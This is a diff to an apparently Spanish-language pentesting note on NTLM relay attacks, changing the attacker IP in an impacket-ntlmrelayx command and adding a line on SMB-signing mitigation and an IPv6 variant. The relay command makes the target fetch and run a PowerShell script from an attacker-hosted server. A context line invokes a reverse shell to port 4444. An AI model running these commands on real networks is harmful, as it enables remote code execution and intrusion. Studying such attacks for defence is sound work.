@@ -34,8 +34,11 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.11.10 -Port 4444
 
 Ejecutamos nuestro Ntlmrelay con la ejecucion de la peticion a nuestro servidor de python 
 ```
-sudo impacket-ntlmrelayx -tf target -smb2support -c "powershell IEX(New-Object Net.WebClient ).downloadString( 'http://192.168.94.128:8000/PS.psi|')"
+sudo impacket-ntlmrelayx -tf target -smb2support -c "powershell IEX(New-Object Net.WebClient ).downloadString( 'http://10.10.11.10:8000/PS.psi|')"
 ```
 
 Guia Visual 
 ![](../../../attachments/images/Diagrama%20visual.png)
+Se puede mitigar firmando el protocolo SMB 
+
+Tambien como segunda variante podemos utilizar IPV6 para intentar ganar acceso de estar mitigado por IPV4
